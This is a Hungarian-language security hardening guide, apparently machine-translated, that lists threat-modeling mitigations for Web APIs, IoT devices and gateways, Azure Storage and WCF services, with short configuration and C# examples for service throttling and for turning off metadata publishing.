## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>A webes API bizalmas adatokat tartalmazó konfigurációs fájljainak részeinek titkosítása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL-fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Útmutató: a ASP.NET 2,0 konfigurációs fejezeteinek titkosítása a DPAPI használatával](/previous-versions/msp-n-p/ff647398(v=pandp.10)), [védett konfigurációs szolgáltató megadásával](/previous-versions/68ze1hb2(v=vs.140)), [Azure Key Vault használatával az alkalmazások titkos adatainak védelméhez](/azure/architecture/multitenant-identity/web-api) |
| **Lépések** | A konfigurációs fájlok, például a Web.config, a appsettings.js, a bizalmas adatok tárolására gyakran használják, beleértve a felhasználóneveket, a jelszavakat, az adatbázis-kapcsolódási karakterláncokat és a titkosítási kulcsokat. Ha nem védik ezeket az információkat, az alkalmazás sebezhetővé válik a támadók és a rosszindulatú felhasználók számára bizalmas információk, például a fiókok felhasználónevei és jelszavaik, az adatbázisok nevei és a kiszolgálók nevei alapján. A központi telepítési típus (Azure/helyszíni) alapján Titkosítsa a konfigurációs fájlok bizalmas részeit a DPAPI vagy olyan szolgáltatásokkal, mint például a Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Győződjön meg arról, hogy az összes felügyeleti felület erős hitelesítő adatokkal van védve

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL-fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Az eszköz vagy a mező átjárója által elérhető felügyeleti felületek erős hitelesítő adatokkal vannak védve. Emellett az egyéb kitett felületek, például a WiFi, az SSH, a fájlmegosztás, az FTP erős hitelesítő adatokkal is biztonságossá válnak. Az alapértelmezett gyenge jelszavakat nem szabad használni. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Győződjön meg arról, hogy az ismeretlen kód nem hajtható végre az eszközökön

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Biztonságos rendszerindítási és bites zárolási eszközök titkosításának engedélyezése a Windows 10 IoT Core-ban](/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Lépések** | A UEFI biztonságos rendszerindítás korlátozza a rendszert, hogy csak a megadott szolgáltató által aláírt bináris fájlok végrehajtását engedélyezze. Ez a szolgáltatás megakadályozza, hogy az ismeretlen kód fusson a platformon, és hogy esetleg gyengítse a biztonsági helyzetét. Engedélyezze az UEFI biztonságos rendszerindítását, és korlátozza az aláíró kód számára megbízható hitelesítésszolgáltatók listáját. Az eszközön központilag telepített összes kód aláírása az egyik megbízható hatóság használatával. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Az operációs rendszer és a IoT-eszköz további partícióinak titkosítása a bites zárolással

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | A Windows 10 IoT Core a bit-Locker-eszközök titkosításának egyszerűsített verzióját valósítja meg, amely erős függőséggel rendelkezik a platformon található TPM jelenlétével, beleértve az UEFI-ben szükséges preOS protokollt, amely a szükséges méréseket végzi. Ezek a preOS-mérések biztosítják, hogy az operációs rendszer később az operációs rendszer elindításának pontos rekordjaival rendelkezik. Titkosítsa az operációsrendszer-partíciókat a bitek és a további partíciók használatával is, ha bizalmas adatokat tárolnak. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Győződjön meg arról, hogy csak a minimális szolgáltatások/szolgáltatások engedélyezve vannak az eszközökön

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL-fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Ne engedélyezze vagy tiltsa le az operációs rendszer azon funkcióit és szolgáltatásait, amelyek nem szükségesek a megoldás működéséhez. Például ha az eszközön nincs szükség felhasználói felület telepítésére, telepítse a Windows IoT Core-t a fej nélküli módban. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Az operációs rendszer és a IoT további partícióinak titkosítása a bit-Locker használatával

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-mező átjárója | 
| **SDL-fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | A Windows 10 IoT Core a bit-Locker-eszközök titkosításának egyszerűsített verzióját valósítja meg, amely erős függőséggel rendelkezik a platformon található TPM jelenlétével, beleértve az UEFI-ben szükséges preOS protokollt, amely a szükséges méréseket végzi. Ezek a preOS-mérések biztosítják, hogy az operációs rendszer később az operációs rendszer elindításának pontos rekordjaival rendelkezik. Titkosítsa az operációsrendszer-partíciókat a bitek és a további partíciók használatával is, ha bizalmas adatokat tárolnak. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Győződjön meg arról, hogy a helyszíni átjáró alapértelmezett bejelentkezési hitelesítő adatai módosulnak a telepítés során

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-mező átjárója | 
| **SDL-fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Győződjön meg arról, hogy a helyszíni átjáró alapértelmezett bejelentkezési hitelesítő adatai módosulnak a telepítés során |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Győződjön meg arról, hogy a felhőalapú átjáró egy folyamatot valósít meg a csatlakoztatott eszközök belső vezérlőprogram naprakészen tartásához

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT Cloud Gateway | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | Átjáró választása – Azure IoT Hub |
| **Hivatkozások**              | [IoT hub eszközkezelés áttekintése](../../iot-hub/iot-hub-device-management-overview.md), [az eszköz belső vezérlőprogram frissítése](../../iot-hub/tutorial-firmware-update.md) |
| **Lépések** | A LWM2M a IoT-eszközök felügyeletének nyílt mobil Szövetségének protokollja. Az Azure IoT-eszközkezelés lehetővé teszi, hogy az eszköz feladataival kommunikáljon a fizikai eszközökkel. Győződjön meg arról, hogy a felhőalapú átjáró olyan folyamatot valósít meg, amely az Azure IoT Hub-eszközkezelés használatával rendszeresen megtartja az eszköz és az egyéb konfigurációs adatok naprakészen tartását. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Győződjön meg arról, hogy az eszközökön szervezeti házirendként konfigurált végponti biztonsági vezérlők vannak konfigurálva

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Számítógép-megbízhatósági kapcsolat határa | 
| **SDL-fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Győződjön meg arról, hogy az eszközökön olyan végponti biztonsági vezérlők találhatók, mint a lemez szintű titkosítás, a víruskereső, a frissített aláírások, a gazdagép-alapú tűzfal, az operációsrendszer-frissítések, a csoportházirendek stb. a szervezeti biztonsági házirendek szerint konfigurálva. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Az Azure Storage-hozzáférési kulcsok biztonságos kezelésének biztosítása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Azure Storage | 
| **SDL-fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Azure Storage – biztonsági útmutató – a Storage-fiók kulcsainak kezelése](../../storage/blobs/security-recommendations.md#identity-and-access-management) |
| **Lépések** | <p>Kulcstároló: javasoljuk, hogy az Azure Storage hozzáférési kulcsait Azure Key Vault titkos kulcsként tárolja, és az alkalmazásokból kérje le a kulcsot a Key vaultból. Ez a következő okok miatt ajánlott:</p><ul><li>Az alkalmazásnak soha nem lesz hardcoded egy konfigurációs fájlban, ami eltávolítja, hogy valaki hozzáférést kap a kulcsokhoz adott engedély nélkül.</li><li>A kulcsok elérését Azure Active Directory használatával lehet vezérelni. Ez azt jelenti, hogy a fiók tulajdonosa hozzáférést biztosíthat a kulcsoknak a Azure Key Vaultból való lekéréséhez szükséges alkalmazásokhoz. Más alkalmazások nem fognak tudni hozzáférni a kulcsokhoz anélkül, hogy az engedélyt kifejezetten megadják</li><li>Kulcs újragenerálása: javasoljuk, hogy a biztonsági okokból az Azure Storage-hozzáférési kulcsok újragenerálására szolgáló folyamattal rendelkezzen. A kulcs újragenerálásának okairól és tervezéséről az Azure Storage biztonsági útmutatójának dokumentációjában olvashat bővebben.</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Győződjön meg arról, hogy csak a megbízható eredetek engedélyezettek, ha a CORS engedélyezve van az Azure Storage-ban

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Azure Storage | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [CORS-támogatás Azure Storage-szolgáltatásokhoz](/rest/api/storageservices/Cross-Origin-Resource-Sharing--CORS--Support-for-the-Azure-Storage-Services) |
| **Lépések** | Az Azure Storage lehetővé teszi, hogy engedélyezze a CORS – több eredetű erőforrás-megosztást. Minden egyes Storage-fiókhoz megadhat olyan tartományokat, amelyek hozzáférhetnek a Storage-fiók erőforrásaihoz. Alapértelmezés szerint a CORS le van tiltva az összes szolgáltatáson. A CORS a REST API vagy a Storage ügyféloldali kódtár használatával engedélyezheti, hogy az egyik módszert hívja meg a szolgáltatási házirendek beállításához. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>A WCF szolgáltatás-szabályozási funkciójának engedélyezése

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | WCF | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | .NET-keretrendszer 3 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [megerősítő Királyság](https://vulncat.fortify.com) |
| **Lépések** | <p>A rendszererőforrások használatának korlátozása nem helyezheti el az erőforrások kimerülését és végső soron a szolgáltatás megtagadását.</p><ul><li>**Magyarázat:** A Windows Communication Foundation (WCF) lehetőséget nyújt a szolgáltatási kérelmek szabályozására. Ha túl sok ügyfél-kérést tud elárasztani, a rendszer kimeríti az erőforrásait. Másfelől azonban csak kis mennyiségű kérést engedélyez a szolgáltatásnak, így megakadályozhatja, hogy a legitim felhasználók használják a szolgáltatást. Minden szolgáltatásnak külön kell beállítania és konfigurálva kell lennie, hogy a megfelelő mennyiségű erőforrást engedélyezze.</li><li>**Javaslatok** Engedélyezze a WCF szolgáltatás-szabályozási funkcióját, és állítsa be az alkalmazáshoz szükséges korlátokat.</li></ul>|

### <a name="example"></a>Példa
Az alábbi példa a szabályozást engedélyező konfigurációt szabályozza:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF – információk közzététele metaadatokon keresztül

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | WCF | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | .NET-keretrendszer 3 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [megerősítő Királyság](https://vulncat.fortify.com) |
| **Lépések** | A metaadatok segítségével a támadók megismerhetik a rendszerrel kapcsolatos információkat, és megtervezhetik a támadási formákat. A WCF-szolgáltatások lehetővé teszik a metaadatok megjelenítését. A metaadatok részletesen ismertetik a szolgáltatás leírását, és nem lehetnek éles környezetben. A `HttpGetEnabled`  /  `HttpsGetEnabled` ServiceMetaData osztály tulajdonságai határozzák meg, hogy egy szolgáltatás elérhetővé teszi-e a metaadatokat | 

### <a name="example"></a>Példa
Az alábbi kód arra utasítja a WCF-t, hogy közvetítse a szolgáltatás metaadatait
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Ne közvetítse a szolgáltatás metaadatait éles környezetben. Állítsa a ServiceMetaData osztály HttpGetEnabled/HttpsGetEnabled tulajdonságát false (hamis) értékre. 

### <a name="example"></a>Példa
Az alábbi kód arra utasítja a WCF-t, hogy ne sugározza a szolgáltatás metaadatait. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```